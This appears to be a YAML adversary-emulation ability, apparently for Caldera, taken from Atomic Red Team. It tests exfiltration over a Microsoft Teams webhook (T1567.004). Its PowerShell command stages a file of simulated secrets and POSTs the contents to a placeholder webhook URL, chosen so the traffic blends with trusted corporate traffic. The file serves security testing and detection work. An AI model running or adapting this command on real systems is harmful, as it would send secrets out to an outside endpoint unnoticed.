- id: 35ad6590-2207-4b14-bf8f-9899470d7156
  name: Exfiltrate staged data to a Microsoft Teams webhook (PowerShell)
  description: 'Stages a file containing simulated sensitive data and exfiltrates
    its contents to a

    Microsoft Teams incoming webhook (Office 365 connector / Power Automate workflow
    URL)

    by POSTing a JSON `text` payload over HTTPS. The endpoint resides on a Microsoft-owned

    domain, allowing the exfiltration to blend in with trusted corporate traffic.

    See https://learn.microsoft.com/en-us/microsoftteams/platform/webhooks-and-connectors/how-to/add-incoming-webhook'
  tactic: exfiltration
  technique:
    attack_id: T1567.004
    name: 'Exfiltration Over Web Service: Exfiltration Over Webhook'
  platforms:
    windows:
      psh:
        command: '"secrets, api keys, passwords - T1567.004 atomic test" | Out-File
          -FilePath "$env:TEMP\T1567.004_loot.txt" -Encoding ascii; $body = @{ text
          = (Get-Content -Raw "$env:TEMP\T1567.004_loot.txt") } | ConvertTo-Json;
          Invoke-RestMethod -Uri "https://example.webhook.office.com/webhookb2/00000000-0000-0000-0000-000000000000@00000000-0000-0000-0000-000000000000/IncomingWebhook/ReplaceWithYourWebhookToken"
          -Method Post -ContentType ''application/json'' -Body $body'
        cleanup: Remove-Item -Path "#{staged_file}" -ErrorAction Ignore
        elevation_required: false
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - t1567.004
  - exfiltration
  - atomic-red-team
  author: Atomic Red Team
  additional_info:
    input_arguments:
      webhook_url:
        description: Microsoft Teams incoming webhook URL the staged data is exfiltrated
          to
        type: string
        default: https://example.webhook.office.com/webhookb2/00000000-0000-0000-0000-000000000000@00000000-0000-0000-0000-000000000000/IncomingWebhook/ReplaceWithYourWebhookToken
      staged_file:
        description: Path to the file that is staged and exfiltrated
        type: path
        default: $env:TEMP\T1567.004_loot.txt
    technique_created: '2023-07-20T15:30:55.763Z'
    atomic_guid: 35ad6590-2207-4b14-bf8f-9899470d7156
    import_timestamp: '2026-07-26T05:31:10.455243Z'
